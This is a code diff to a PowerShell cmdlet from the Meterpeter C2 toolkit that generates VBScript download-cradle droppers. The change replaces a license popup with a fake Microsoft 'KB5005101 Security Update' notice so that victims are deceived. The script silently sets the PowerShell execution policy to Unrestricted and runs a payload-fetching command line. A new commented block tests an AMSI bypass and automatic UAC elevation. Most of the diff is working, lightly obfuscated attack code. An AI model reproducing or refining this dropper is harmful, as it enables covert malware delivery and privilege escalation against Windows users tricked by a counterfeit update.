@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19043) x64 bits
    Required Dependencies: @Meterpeter C2 v2.10.14
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.2.13
+   PS cmdlet Dev version: v1.2.14
 
 .DESCRIPTION
    Cmdlet to create download_crandle.vbs that allow @Meterpeter C2 v2.10.14
@@ -207,10 +207,10 @@ $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
 Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
 
 set ObjSSLTerminal = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 ObjSSLTerminal.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 ObjSSLTerminal.Run(`"$TechnicDefault_Tmp`"), 0
-}")
+WScript.Quit")
 
 
 $AutoElevation = @("'
@@ -238,7 +238,7 @@ End If
 
 '''''''''''''''''''''
 ' HELP - GENERAL
-CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 
 SSLProvider.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 SSLProvider.Run(`"$TechnicDefault_Tmp`"), 0
@@ -334,11 +334,11 @@ Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
 '''''''''''''''''''''
 ' HELP - GENERAL
 set ObjSSLProvider = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 
 ObjSSLProvider.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
 ObjSSLProvider.Exec(`"$CrandleCmdLine`")
-}")
+WScript.Quit")
 
 
 $AutoElevation = @("'
@@ -367,13 +367,55 @@ End If
 '''''''''''''''''''''
 ' HELP - GENERAL
 set ObjMicrosoftDisclamer = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 
 ObjMicrosoftDisclamer.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
-ObjMicrosoftDisclamer.Exec(`"$CrandleCmdLine`")")
+ObjMicrosoftDisclamer.Exec(`"$CrandleCmdLine`")
+WScript.Quit")
 
 
-<#
+<# testing [a]msi bypass
+$AutoElevation = @("'
+' Copyright (c) Microsoft Corporation.  All rights reserved.
+'
+' VBScript Source File
+'
+' Script Name: $SCNa
+'
+
+'''''''''''''''''''''
+' Vars
+dIm $gUid,CookieAuth,AuthToken,$Apii,Cmd,Layback,fdx,ttl
+AuthToken = WScript.FullName:$gUid = StrReverse(`"sanur`")
+ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
+$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
+Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
+
+If WScript.Arguments.length = 0 Then
+   CookieAuth = WScript.ScriptFullName
+   Set ObjTerminal = CreateObject(`"Shell.Application`"):Wscript.Sleep($TokenAuth)
+   ObjTerminal.ShellExecute AuthToken, Chr(34) & CookieAuth & Chr(34) & `" /debug`", `"`", $gUid
+   WScript.Quit
+End If
+
+'''''''''''''''''''''
+' HELP - GENERAL
+set ObjMicrosoftDisclamer = CreateObject(`"Wscript.Shell`")
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161`" & vbcrlf & `"This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
+
+Set objFSO = CreateObject(`"Scripting.FileSystemObject`")
+objStartFolder = `"C:\Users\Public`"
+
+ObjMicrosoftDisclamer.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
+Set objFolder = objFSO.GetFolder(objStartFolder)
+Set colFiles = objFolder.Files
+For Each objFile in colFiles
+    ObjMicrosoftDisclamer.Exec(`"$CrandleCmdLine`")
+Next")
+#>
+
+
+<# Old elevation way
 $AutoElevation = @("dIm reverse
 reverse = StrReverse(`"sanur`") 
 ' test if administrator privileges
